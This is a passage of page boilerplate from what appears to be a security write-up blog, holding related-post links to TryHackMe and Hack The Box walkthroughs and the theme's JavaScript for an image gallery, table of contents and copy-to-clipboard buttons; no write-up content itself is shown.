11.546875 25.753906 C 20.605469 25.753906 25.558594 18.25 25.558594 11.742188 C 25.558594 11.53125 25.550781 11.316406 25.542969 11.105469 C 26.503906 10.410156 27.339844 9.542969 28 8.558594 Z M 28 8.558594 "/>
</g>
</svg>

      </a>
      
      
      
      
      
      
      
      
      
      
    </div>
  </div>
</section>
<hr class="hr-slash whoami-hr" />


    <section class="related">
    
    
    <h1 class="related__title">
      <hr class="hr-dots"/>
      <div>
        Read other posts
      </div>
      <hr class="hr-dots"/>
    </h1>
    <ul class="related-ul">
        
        <li>
          <a href="/posts/psychobreak/" class="related__link">TryHackMe - Psycho Break</a>
        </li>
        
        <li>
          <a href="/posts/admirer/" class="related__link">Hack The Box - Admirer</a>
        </li>
        
        <li>
          <a href="/posts/pokemon/" class="related__link">TryHackMe - Gotta Catch&#39;em All!</a>
        </li>
        
        <li>
          <a href="/posts/biohazard/" class="related__link">TryHackMe - Biohazard</a>
        </li>
        
        <li>
          <a href="/posts/easypeasy/" class="related__link">TryHackMe - Easy Peasy</a>
        </li>
        
    </ul>
    
  </section>
    <div class="grow"></div>
<nav class="pagination-single">
  
    
      <a href="https://sckull.github.io/posts/allinone/" class="pagination-single__left">
        <div class="pagination-single__icon">
          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M19 11H7.83l4.88-4.88c.39-.39.39-1.03 0-1.42-.39-.39-1.02-.39-1.41 0l-6.59 6.59c-.39.39-.39 1.02 0 1.41l6.59 6.59c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L7.83 13H19c.55 0 1-.45 1-1s-.45-1-1-1z"/></svg>
        </div>
        <div class="pagination-single__left-title">TryHackMe - All in One</div>      
      </a>
    
    <div class="grow"></div>
    
      <a href="https://sckull.github.io/posts/omni/" class="pagination-single__right">      
        <div class="pagination-single__right-title">Hack The Box - Omni</div>
        <div class="pagination-single__icon">
          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"/></svg>
        </div>
      </a>
    
  
</nav>
    
    <div class="modal micromodal-slide" id="modal" aria-hidden="true">
  <div class="modal__overlay" tabindex="-1" data-micromodal-close>
    <div class="modal__container" role="dialog" aria-modal="true" aria-labelledby="modal-title">
      
      <div class="modal__content" id="modal-content">
        <div id="mySwipe" class="swipe">
          <div class="swipe-wrap">
          </div>
        </div>
      </div>

      <span class="modal__items">
        
        <span class="modal__header">
          <div class="modal__paging" title="Page Info" aria-label="Current Page">
          </div>
          <div class="modal__icon modal__toolbar modal__toolbar--close" title="Close" aria-label="Close Button" data-micromodal-close>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="25" height="25"><path fill="currentColor" d="M 21.734375 19.640625 L 19.636719 21.734375 C 19.253906 22.121094 18.628906 22.121094 18.242188 21.734375 L 13 16.496094 L 7.761719 21.734375 C 7.375 22.121094 6.746094 22.121094 6.363281 21.734375 L 4.265625 19.640625 C 3.878906 19.253906 3.878906 18.628906 4.265625 18.242188 L 9.503906 13 L 4.265625 7.761719 C 3.882813 7.371094 3.882813 6.742188 4.265625 6.363281 L 6.363281 4.265625 C 6.746094 3.878906 7.375 3.878906 7.761719 4.265625 L 13 9.507813 L 18.242188 4.265625 C 18.628906 3.878906 19.257813 3.878906 19.636719 4.265625 L 21.734375 6.359375 C 22.121094 6.746094 22.121094 7.375 21.738281 7.761719 L 16.496094 13 L 21.734375 18.242188 C 22.121094 18.628906 22.121094 19.253906 21.734375 19.640625 Z"/></svg>
          </div>
          <div class="modal__icon modal__toolbar modal__toolbar--full" title="Full Screen" aria-label="Full Screen Button">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="25" height="25"><path fill="currentColor" d="M 5 3 C 3.9069372 3 3 3.9069372 3 5 L 3 8 A 1.0001 1.0001 0 1 0 5 8 L 5 5 L 8 5 A 1.0001 1.0001 0 1 0 8 3 L 5 3 z M 16 3 A 1.0001 1.0001 0 1 0 16 5 L 19 5 L 19 8 A 1.0001 1.0001 0 1 0 21 8 L 21 5 C 21 3.9069372 20.093063 3 19 3 L 16 3 z M 3.984375 14.986328 A 1.0001 1.0001 0 0 0 3 16 L 3 19 C 3 20.093063 3.9069372 21 5 21 L 8 21 A 1.0001 1.0001 0 1 0 8 19 L 5 19 L 5 16 A 1.0001 1.0001 0 0 0 3.984375 14.986328 z M 19.984375 14.986328 A 1.0001 1.0001 0 0 0 19 16 L 19 19 L 16 19 A 1.0001 1.0001 0 1 0 16 21 L 19 21 C 20.093063 21 21 20.093063 21 19 L 21 16 A 1.0001 1.0001 0 0 0 19.984375 14.986328 z"/></svg>
          </div>
          <div class="modal__icon modal__toolbar modal__toolbar--normal" title="Normal Screen" aria-label="Normal Screen Button">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="25" height="25"><path fill="currentColor" d="M 16.96875 4.972656 C 15.867188 4.988281 14.984375 5.894531 15 7 L 15 15 L 7 15 C 6.277344 14.988281 5.609375 15.367188 5.246094 15.992188 C 4.878906 16.613281 4.878906 17.386719 5.246094 18.007813 C 5.609375 18.632813 6.277344 19.011719 7 19 L 19 19 L 19 7 C 19.007813 6.460938 18.796875 5.941406 18.414063 5.558594 C 18.03125 5.175781 17.511719 4.964844 16.96875 4.972656 Z M 32.96875 4.972656 C 31.921875 4.988281 31.0625 5.8125 31.003906 6.859375 C 31 6.90625 31 6.953125 31 7 L 31 19 L 43 19 C 43.066406 19 43.132813 19 43.199219 18.992188 C 44.269531 18.894531 45.070313 17.972656 45.015625 16.902344 C 44.964844 15.828125 44.074219 14.988281 43 15 L 35 15 L 35 7 C 35.007813 6.460938 34.796875 5.941406 34.414063 5.558594 C 34.03125 5.175781 33.511719 4.964844 32.96875 4.972656 Z M 7 31 C 6.277344 30.988281 5.609375 31.367188 5.246094 31.992188 C 4.878906 32.613281 4.878906 33.386719 5.246094 34.007813 C 5.609375 34.632813 6.277344 35.011719 7 35 L 15 35 L 15 43 C 14.988281 43.722656 15.367188 44.390625 15.992188 44.753906 C 16.613281 45.121094 17.386719 45.121094 18.007813 44.753906 C 18.632813 44.390625 19.011719 43.722656 19 43 L 19 31 Z M 31 31 L 31 43 C 30.988281 43.722656 31.367188 44.390625 31.992188 44.753906 C 32.613281 45.121094 33.386719 45.121094 34.007813 44.753906 C 34.632813 44.390625 35.011719 43.722656 35 43 L 35 35 L 43 35 C 43.722656 35.011719 44.390625 34.632813 44.753906 34.007813 C 45.121094 33.386719 45.121094 32.613281 44.753906 31.992188 C 44.390625 31.367188 43.722656 30.988281 43 31 Z"/></svg>
          </div>
        </span>
        
        <div class="modal__icon modal__arrow modal__arrow--left" title="Arrow Left" aria-label="Arrow Left Button">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="28" height="28"><path fill="currentColor" d="M 23.28125 11 L 10 10 L 10 6.851563 C 10 6.523438 9.839844 6.277344 9.519531 6.03125 C 9.199219 5.949219 8.878906 5.949219 8.640625 6.113281 C 5.359375 8.410156 2.238281 12.257813 2.160156 12.421875 C 2.082031 12.578125 2.007813 12.8125 2.003906 12.976563 C 2.003906 12.980469 2 12.988281 2 12.992188 C 2 13.15625 2.078125 13.402344 2.160156 13.484375 C 2.238281 13.648438 5.28125 17.507813 8.640625 19.804688 C 8.960938 19.96875 9.28125 20.050781 9.519531 19.886719 C 9.839844 19.722656 10 19.476563 10 19.148438 L 10 16 L 23.28125 15 C 23.679688 14.679688 24 13.875 24 12.992188 C 24 12.195313 23.761719 11.320313 23.28125 11 Z"/></svg>
        </div>
        
        <div class="modal__icon modal__arrow modal__arrow--right" title="Arrow Right" aria-label="Arrow Right Button">

          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="28" height="28"><path fill="currentColor" d="M 2.71875 11.023438 L 16 10.023438 L 16 6.875 C 16 6.546875 16.160156 6.300781 16.480469 6.054688 C 16.800781 5.972656 17.121094 5.972656 17.359375 6.136719 C 20.640625 8.433594 23.761719 12.28125 23.839844 12.445313 C 23.917969 12.601563 23.992188 12.835938 23.996094 13 C 23.996094 13.003906 24 13.011719 24 13.015625 C 24 13.179688 23.921875 13.425781 23.839844 13.507813 C 23.761719 13.671875 20.71875 17.53125 17.359375 19.828125 C 17.039063 19.992188 16.71875 20.074219 16.480469 19.910156 C 16.160156 19.746094 16 19.5 16 19.171875 L 16 16.023438 L 2.71875 15.023438 C 2.320313 14.703125 2 13.898438 2 13.015625 C 2 12.21875 2.238281 11.34375 2.71875 11.023438 Z"/></svg>
        </div>

        <div class="modal__caption">
          <div class="modal__caption--text">
          </div>
        </div>

      </span>
    </div>
  </div>
</div>


<script defer src="/js/swipe.min.08ff2be1b74347bad9e267f732f1388d271b2f9d97b6a8a87bd6a510f17c5ad2.js"></script>

<script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>

<script defer src="/js/helper/fadeinout.min.js"></script>

<script>
document.addEventListener('DOMContentLoaded', function () {
  
   
  var docElem = document.documentElement;

   
  function openFullscreen() {
    if (docElem.requestFullscreen) {
      docElem.requestFullscreen();
    } else if (docElem.mozRequestFullScreen) {  
      docElem.mozRequestFullScreen();
    } else if (docElem.webkitRequestFullscreen) {  
      docElem.webkitRequestFullscreen();
    } else if (docElem.msRequestFullscreen) {  
      docElem.msRequestFullscreen();
    }
  }

   
  function closeFullscreen() {
    if (document.fullscreenElement ||
      document.webkitFullscreenElement ||
      document.mozFullScreenElement) {
      if (document.exitFullscreen) {
        document.exitFullscreen();
      } else if (document.mozCancelFullScreen) {  
        document.mozCancelFullScreen();
      } else if (document.webkitExitFullscreen) {  
        document.webkitExitFullscreen();
      } else if (document.msExitFullscreen) {  
        document.msExitFullscreen();
      }
    }
  }

  var modal = document.getElementById('modal');
  var galleryContainerElem = document.querySelector('.gallery__container');
  var swipeWrapElem = document.querySelector('.swipe-wrap');
  var mySwipeElem = document.getElementById('mySwipe');
  var arrowLeftElem = document.querySelector('.modal__arrow--left');
  var arrowRightElem = document.querySelector('.modal__arrow--right');
  var closeElem = document.querySelector('.modal__toolbar--close');
  var fullElem = document.querySelector('.modal__toolbar--full');
  var normalElem = document.querySelector('.modal__toolbar--normal');
  var captionElem = document.querySelector('.modal__caption');
  var pagingElem = document.querySelector('.modal__paging');
  var itemsElem = document.querySelector('.modal__items');
  var imgTotalNum = null;
  var myFadeTimeout = null;
  var mySwipe = null;
  var keydownFunction = function (e) {
    if (e.key === 'ArrowRight') {
      if (modal && modal.classList.contains('is-open')) {
        mySwipe.next();
      }
    } else if (e.key === 'ArrowLeft') {
      if (modal && modal.classList.contains('is-open')) {
        mySwipe.prev();
      }
    }
  }

  if (galleryContainerElem) {
    imgTotalNum = galleryContainerElem.querySelectorAll('img').length;
  } else {
    galleryContainerElem = document.querySelector('.single__contents');
    imgTotalNum = galleryContainerElem.querySelectorAll('img').length;
  }

  MicroModal.init({
    onClose: function () {
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
        closeFullscreen();
      }
      window.removeEventListener('keydown', keydownFunction);
    },
    disableScroll: true,
    disableFocus: true,
    awaitOpenAnimation: false,
    awaitCloseAnimation: false,
    debugMode: false,
  });

  var imageLoad = function(src) {
    return new Promise(function(resolve, reject) {
      var newImg = new Image;
      newImg.onload = function() {
        resolve(newImg);
      }
      newImg.onerror = reject;
      newImg.src = src;
    });
  }

  galleryContainerElem.querySelectorAll('img').forEach(function (elem, idx) {
    elem.style.cursor = 'pointer';

    var clonedElem = elem.cloneNode(true);
    clonedElem.style.maxHeight = '100%';
    clonedElem.style.maxWidth = '100%';
    clonedElem.onclick = function (e) {
      e.stopPropagation();
    }

    var wrapper = document.createElement('div');
    wrapper.style.width = '100%';
    wrapper.style.height = '100vh';
    wrapper.setAttribute('data-micromodal-close', '');
    wrapper.onclick = function () {
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
      }
    }
    wrapper.onmouseenter = function () {
      clearTimeout(myFadeTimeout);
      fadeIn(itemsElem, 200);
    };
    wrapper.onmouseleave = function () {
      myFadeTimeout = setTimeout(function () {
        fadeOut(itemsElem, 200);
      }, 2500);
    }
    wrapper.ontouchstart = function() {
      fadeIn(itemsElem, 200);
    }
    wrapper.append(clonedElem);
    swipeWrapElem.append(wrapper);

    elem.addEventListener('click', async function (e) {
      MicroModal.show('modal');
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
      }

      var imgSrc = e.target.getAttribute('data-src') || e.target.getAttribute('src');
      var img = await imageLoad(imgSrc);
      clonedElem.style.width = img.width + 'px';
      clonedElem.style.height = img.height + 'px';
      
      
      mySwipe = new Swipe(mySwipeElem, {
        startSlide: idx,
        draggable: true,
        autoRestart: false,
        continuous: false,
        disableScroll: true,
        stopPropagation: true,
        callback: async function (index, element) {
          
          var imgElem = element.querySelector('img');
          var imgSrc = imgElem.getAttribute('data-src') || imgElem.getAttribute('src');
          var img = await imageLoad(imgSrc);
          imgElem.style.width = img.width + 'px';
          imgElem.style.height = img.height + 'px';

          
          if (captionElem && imgElem) {
            var caption = null;
            if (imgElem.getAttribute('data-caption')) {
              caption = imgElem.getAttribute('data-caption');
            } else if (imgElem.getAttribute('title')) {
              caption = imgElem.getAttribute('title');
            } else if (imgElem.getAttribute('alt')) {
              caption = imgElem.getAttribute('alt');
            } else {
              caption = imgElem.getAttribute('src');
            }

            captionElem.querySelector('.modal__caption--text').innerText = caption;
            pagingElem.innerText = (index + 1) + ' / ' + imgTotalNum;

            clearTimeout(myFadeTimeout);
            fadeIn(itemsElem, 200);
          }
        },
      });

      fadeIn(itemsElem);

      
      if (captionElem) {
        var caption = null;
        if (e.target.getAttribute('data-caption')) {
          caption = e.target.getAttribute('data-caption');
        } else if (e.target.getAttribute('title')) {
          caption = e.target.getAttribute('title');
        } else if (e.target.getAttribute('alt')) {
          caption = e.target.getAttribute('alt');
        } else {
          caption = e.target.getAttribute('src');
        }

        captionElem.querySelector('.modal__caption--text').innerText = caption;
        pagingElem.innerText = (idx + 1) + ' / ' + imgTotalNum;
      }

      if (normalElem && fullElem) {
        normalElem.style.zIndex = -1;
        normalElem.style.opacity = 0;
        fullElem.style.zIndex = 25;
        fullElem.style.opacity = 1;
      }
    });

    window.addEventListener('keydown', keydownFunction);
  });

  arrowLeftElem ?
    arrowLeftElem.addEventListener('click', function (e) {
      if (mySwipe) {
        mySwipe.prev();
      }
    }) : null;
  arrowRightElem ?
    arrowRightElem.addEventListener('click', function (e) {
      if (mySwipe) {
        mySwipe.next();
      }
    }) : null;

  closeElem ?
    closeElem.addEventListener('click', function () {
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
      }
      closeFullscreen();
      MicroModal.close('modal');
    }) : null;

  fullElem ?
    fullElem.addEventListener('click', function (e) {
      openFullscreen();
      if (normalElem) {
        normalElem.style.zIndex = 25;
        normalElem.style.opacity = 1;
        fullElem.style.zIndex = -1;
        fullElem.style.opacity = 0;
      }
    }) : null;

  normalElem ?
    normalElem.addEventListener('click', function (e) {
      closeFullscreen();
      if (fullElem) {
        fullElem.style.zIndex = 25;
        fullElem.style.opacity = 1;
        normalElem.style.zIndex = -1;
        normalElem.style.opacity = 0;
      }
    }) : null;
  
});
</script>

    <div class="hide">
      

<div class="search">
  <span class="icon">
    <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="currentColor" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path d="M15.5 14h-.79l-.28-.27c1.2-1.4 1.82-3.31 1.48-5.34-.47-2.78-2.79-5-5.59-5.34-4.23-.52-7.79 3.04-7.27 7.27.34 2.8 2.56 5.12 5.34 5.59 2.03.34 3.94-.28 5.34-1.48l.27.28v.79l4.25 4.25c.41.41 1.08.41 1.49 0 .41-.41.41-1.08 0-1.49L15.5 14zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
  </span>
  <input id="search" aria-label="Site Search" class="input" type="text" placeholder="Buscar" autocomplete="off">
  <div id="search-results" class="dropdown">
    <div id="search-menu" class="dropdown-menu" role="menu">
    </div>
  </div>
</div>


    </div>
  </div>
</main>


<script>
  
  
  

  var enableToc = JSON.parse("true");
  var toc = JSON.parse("null");
  var tocPosition = JSON.parse("\"outer\"");
  
  var singleMainElem = document.querySelector('.single__main');
  var singleSideElem = document.querySelector('.single__side');

  enquire.register("screen and (max-width: 769px)", {
    match: function () {
      if ((enableToc || toc) && tocPosition !== "outer") {
        if (singleMainElem && singleSideElem) {
          singleMainElem.classList.remove('main-main');
          singleMainElem.classList.add('main');
          singleSideElem.classList.remove('main-side');
          singleSideElem.classList.add('hide');
        }
      } else if (tocPosition === "outer") {
        if (singleMainElem && !singleMainElem.classList.contains('main-main')) {
          singleMainElem.classList.remove('main-main');
          singleMainElem.classList.add('main');
        }
        if (singleSideElem && !singleSideElem.classList.contains('hide')) {
          singleSideElem.classList.add('hide');
        }
      }
    },
    unmatch: function () {
      if ((enableToc || toc) && tocPosition !== "outer") {
        singleMainElem.classList.remove('main');
        singleMainElem.classList.add('main-main');
        singleSideElem.classList.remove('hide');
        singleSideElem.classList.add('main-side');
      } else if (tocPosition === "outer") {
        if (singleMainElem && !singleMainElem.classList.contains('main-main')) {
          singleMainElem.classList.remove('main-main');
          singleMainElem.classList.add('main');
        }
        if (singleSideElem && !singleSideElem.classList.contains('hide')) {
          singleSideElem.classList.add('hide');
        }
      }

      var navCollapseBtn = document.querySelector('.navbar__burger');
      var navCollapse = document.getElementsByClassName('navbarm__collapse')[0];
      if (navCollapse) {
        navCollapse.setAttribute('data-open', false);
        navCollapse.style.maxHeight = 0;
        navCollapseBtn.classList.remove('is-active');
      }
      document.getElementsByClassName('navbar__menu')[0].classList.remove('is-active');
      document.getElementsByClassName('mobile-search')[0].classList.add('hide');
    },
    setup: function () { },
    deferSetup: true,
    destroy: function () { },
  });
</script>




<script defer src="/js/clipboard.min.1626706afc88d95ebe1173b553ec732c6dc82a576989315fdf5e7779af738a44.js"></script>

<script defer src="/js/helper/getParents.min.js"></script>

<script defer src="/js/helper/closest.min.js"></script>

<script defer src="/js/helper/prev.min.js"></script>

<script defer src="/js/helper/prop.min.js"></script>

<script defer src="/js/helper/fadeinout.min.js"></script>

















<script>
  'use strict';

  window.onload = function() {
    var navbar = document.querySelector('.navbar');
    var singleContentsElem = document.querySelector('.single__contents');

    
    
    
    var enableBusuanzi = JSON.parse("false");
    var busuanziPagePV = JSON.parse("true");
    
    if (enableBusuanzi && busuanziPagePV) {
      var pagePvElem = document.querySelector('#busuanzi_value_page_pv');
      pagePvElem.textContent = pagePvElem.textContent.replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1,");
    }    
    


    
    
    
    
    
    
    var enableToc = JSON.parse("true");
    var toc = JSON.parse("null");
    var hideToc = JSON.parse("false");
    var tocFlexbox = document.querySelector('.toc__flexbox');
    var tocFlexboxOuter = document.querySelector('.toc__flexbox--outer');
    var tocFolding = JSON.parse("null");
    
    if ((enableToc || toc) && document.querySelector('.toc')) {
      var tableOfContentsElem = document.querySelector('.toc').querySelector('#TableOfContents');

      if (false === tocFolding) {

      } else {
        tableOfContentsElem.querySelectorAll('ul') ?
          tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
            rootUl.querySelectorAll('li').forEach(function (liElem) {
              liElem.querySelectorAll('ul').forEach(function (ulElem) {
                ulElem.style.display = 'none';
              });
            });
          }) : null;
      }

      if (tableOfContentsElem) {
        if (tableOfContentsElem.querySelectorAll('a').length > 0) {
          tableOfContentsElem.querySelectorAll('a').forEach(function (elem) {
            elem.addEventListener('click', function () {
              var id = elem.getAttribute('id');
              navbar.classList.remove('navbar--show');
              navbar.classList.remove('navbar--hide');
              navbar.classList.add('navbar--hide');

              document.querySelector('.toc').querySelectorAll('a').forEach(function (elem) {
                elem.classList.remove('active');
              });
              elem.classList.add('active');

              var curElem = tableOfContentsElem.querySelector('[href="#' + id + '"]');
              if (curElem && curElem.nextElementSibling) {
                curElem.nextElementSibling.style.display = 'block';
              }
              if (curElem) {
                getParents(curElem, 'ul') ?
                  getParents(curElem, 'ul').forEach(function (elem) {
                    elem.style.display = 'block';
                  }) : null;
              }
            });
          });
        } else {
          if (tocFlexbox) {
            tocFlexbox.setAttribute('data-position', '');
            if (!tocFlexbox.classList.contains('hide')) {
              tocFlexbox.classList.add('hide');
            }
          }
          if (tocFlexboxOuter) {
            tocFlexboxOuter.setAttribute('data-position', '');
            if (!tocFlexboxOuter.classList.contains('hide')) {
              tocFlexboxOuter.classList.add('hide');
            }
          }
        }
      }

      
      var toggleTocElem = document.getElementById("toggle-toc");
      var visibleTocElem = document.getElementById('visible-toc');
      var tocElem = document.querySelector('.toc');
      var mainElem = document.querySelector('main');
      var sideElem = document.querySelector('side');
      var tocFlexboxElem = document.querySelector('.toc__flexbox');

      toggleTocElem ? 
      toggleTocElem.addEventListener('change', function(e) {
        if (e.target.checked) {
          if (tocElem) {
            fadeIn(tocElem, 200);
          }
          if (tocFlexboxElem) {
            tocFlexboxElem.setAttribute('data-position', 'fixed');
          }

          if (mainElem) {
            mainElem.classList.remove('main-main');
            mainElem.classList.remove('main');
            mainElem.classList.add('main-main');
          }
          if (sideElem) {
            sideElem.classList.remove('main-side');
          }
        } else {
          if (tocElem) {
            fadeOut(tocElem, 200);
          }
          if (tocFlexboxElem) {
            tocFlexboxElem.setAttribute('data-position', 'absolute');
          }

          if (mainElem) {
            mainElem.classList.remove('main-main');
            mainElem.classList.remove('main');
            mainElem.classList.add('main');
          }
          if (sideElem) {
            sideElem.classList.remove('main-side');
          }
        }
      }) : null;

      visibleTocElem ?
      visibleTocElem.addEventListener('change', function(e) {
        if (e.target.checked) {
          if (tocElem) {
            fadeIn(tocElem, 200);
          }
        } else {
          if (tocElem) {
            fadeOut(tocElem, 200);
          }
        }
      }) : null;
    }
    


    
    var tables = document.querySelectorAll('.single__contents > table');
    for (let i = 0; i < tables.length; i++) {
      var table = tables[i];
      var wrapper = document.createElement('div');
      wrapper.className = 'table-wrapper';
      table.parentElement.replaceChild(wrapper, table);
      wrapper.appendChild(table);
    }
    


    
    var text, clip = new ClipboardJS('.anchor');
    var headers = singleContentsElem.querySelectorAll("h1, h2, h3, h4");

    
    var languagedir = JSON.parse("\"ltr\"");

    headers ? 
    headers.forEach(function (elem) {
      var url = encodeURI(document.location.origin + document.location.pathname);
      var link = url + "#" + elem.getAttribute('id');
      var newElemOuter = document.createElement('span');
      newElemOuter.classList.add('anchor');
      newElemOuter.classList.add('hide');
      newElemOuter.setAttribute('data-clipboard-text', link);
      newElemOuter.style.position = 'relative';

      var newElemInner = document.createElement('span');
      newElemInner.style.fontSize = '1rem';
      newElemInner.style.position = 'absolute';
      newElemInner.style.top = '50%';
      newElemInner.style.transform = 'translateY(-50%)';
      newElemInner.innerText = "🔗";

      if (languagedir === "rtl") {
        newElemInner.style.left = '-2rem';
      } else {
        newElemInner.style.right = '-2rem';
      }

      newElemOuter.append(newElemInner);
      elem.append(newElemOuter);

      elem.addEventListener('mouseenter', function() {
        this.querySelector('.anchor').classList.remove('hide');
      });
      elem.addEventListener('mouseleave', function () {
        this.querySelector('.anchor').classList.add('hide');
      });
    }) : null;

    document.querySelectorAll('.anchor').forEach(function(elem) {
      elem.addEventListener('mouseleave', function() {
        elem.setAttribute('aria-label', null);
        elem.classList.remove('tooltipped');
        elem.classList.remove('tooltipped-s');
        elem.classList.remove('tooltipped-w');
      });
    });

    clip.on('success', function (e) {
      e.clearSelection();
      e.trigger.setAttribute('aria-label', 'Link copied to clipboard!');
      e.trigger.classList.add('tooltipped');
      e.trigger.classList.add('tooltipped-s');
    });
    


    
    var clipInit = false;
    var preChromaElem = document.querySelectorAll('pre.chroma');
    var langCodeElem = document.querySelectorAll('.language-code');
    var dollarCodeElem = document.querySelectorAll('div.language-\\$');
    var gtCodeElem = document.querySelectorAll('div.language-\\>');

    var makeClipboard = function(elem) {
      var code = elem,
        text = elem.textContent;
        
      if (text.length > 15) {
        if (!clipInit) {
          var text, clip = new ClipboardJS('.copy-to-clipboard', {
            text: function (trigger) {
              var codeElem = prev(trigger).querySelectorAll('code');
              if (codeElem.length > 1) {
                text = prev(trigger).querySelector('code[class^="language-"]').textContent;
              } else {
                text = prev(trigger).querySelector('code').textContent;
              }

              return text.replace(/^\$\s/gm, '');
            }
          });

          var inPre;
          clip.on('success', function (e) {
            e.clearSelection();
            inPre = prop(e.trigger.parentNode, 'tagName') == 'PRE';
            e.trigger.setAttribute('aria-label', 'Copied to clipboard!');
            e.trigger.classList.add('tooltipped');
            e.trigger.classList.add('tooltipped-w');
          });

          clip.on('error', function (e) {
            inPre = prop(e.trigger.parentNode, 'tagName') == 'PRE';
            e.trigger.setAttribute('aria-label', e.action.toString());
            e.trigger.classList.add('tooltipped');
            e.trigger.classList.add('tooltipped-w');
          });

          clipInit = true;
        }

        var notAllowedClass = ['language-mermaid', 'language-viz', 'language-wave', 'language-chart', 'language-msc', 'language-flowchart'];
        var isNotAllowedIncluded = false;
        var curClassName = code.getAttribute('class');

        for (var i = 0; i < notAllowedClass.length; i++) {
          if (curClassName && curClassName.startsWith(notAllowedClass[i])) {
            isNotAllowedIncluded = true;
            break;
          }
        }

        if (!isNotAllowedIncluded) {
          if (curClassName) {
            var newClipboardElem = document.createElement('span');
            newClipboardElem.setAttribute('class', 'copy-to-clipboard');
            newClipboardElem.setAttribute('title', 'Copy to clipboard');
            elem.parentNode.parentNode.insertBefore(newClipboardElem, elem.parentNode.nextElementSibling);
          }
        }
      }
    }

    var makeSymbolClipboard = function(elem) {
      var clipboardSpan = document.createElement('span');
      clipboardSpan.setAttribute('class', 'copy-to-clipboard');
      clipboardSpan.setAttribute('title', 'Copy to clipboard');
      elem.parentNode.parentNode.insertBefore(clipboardSpan, elem.parentNode.nextElementSibling);
    }

    preChromaElem ? 
    preChromaElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function(codeElem) {
        makeClipboard(codeElem);
      });
    }) : null;
    
    langCodeElem ? 
    langCodeElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function (codeElem) {
        makeClipboard(codeElem);
      });
    }) : null;

    dollarCodeElem ? 
    dollarCodeElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function (codeElem) {
        makeSymbolClipboard(codeElem);
      });
    }) : null;

    gtCodeElem ?
    gtCodeElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function (codeElem) {
        makeSymbolClipboard(codeElem);
      });
    }) : null;
    


    
    dollarCodeElem ?
    dollarCodeElem.forEach(function(elem) {
      var lnts = elem.parentNode.parentNode ? elem.parentNode.parentNode.querySelectorAll('.lnt') : null;
      lnts ? 
      lnts.forEach(function(lnt) {
        lnt.innerHTML = '$<br/>';
      }) : null;
    }) : null;

    gtCodeElem ?
    gtCodeElem.forEach(function(elem) {
      var lnts = elem.parentNode.parentNode ? elem.parentNode.parentNode.querySelectorAll('.lnt') : null;
      lnts ? 
      lnts.forEach(function(lnt) {
        lnt.innerHTML = '><br/>';
      }) : null;
    }) : null;
    


    
    
    var lib = JSON.parse("null");

    if (lib && lib.includes('mermaid')) {
      
      var themeVariant = localStorage.getItem('theme') || JSON.parse("\"dark\"");

      if (themeVariant === "dark" || themeVariant === "hacker") {
        mermaid.initialize({ theme: 'dark' });
      } else {
        mermaid.initialize({ theme: 'default' });
      }
      
      var mermaids = [];
      [].push.apply(mermaids, document.getElementsByClassName('language-mermaid'));
      mermaids.forEach(function(elem) {
        var elemParentNode = elem.parentNode;

        if (elemParentNode !== document.body) {
          elemParentNode.parentNode.insertBefore(elem, elemParentNode);
          elemParentNode.parentNode.removeChild(elemParentNode);
        }

        var newElemWrapper = document.createElement('div');
        newElemWrapper.classList.add('mermaid');
        newElemWrapper.style.padding = '34px 4px 6px';
        newElemWrapper.innerHTML = elem.innerHTML;
        elem.replaceWith(newElemWrapper);
      });
    }
    
    

    
    if (lib && lib.includes('katex')) {
      var mathElements = document.getElementsByClassName('math');
      var options = {
        delimiters: [
          { left: "$$", right: "$$", display: true },
          { left: "\\[", right: "\\]", display: true },
          { left: "$", right: "$", display: false },
          { left: "\\(", right: "\\)", display: false }
        ],
      };

      renderMathInElement(document.querySelector('.single__contents'), options);
    }
    


    
    if (lib && lib.includes('flowchartjs')) {
      
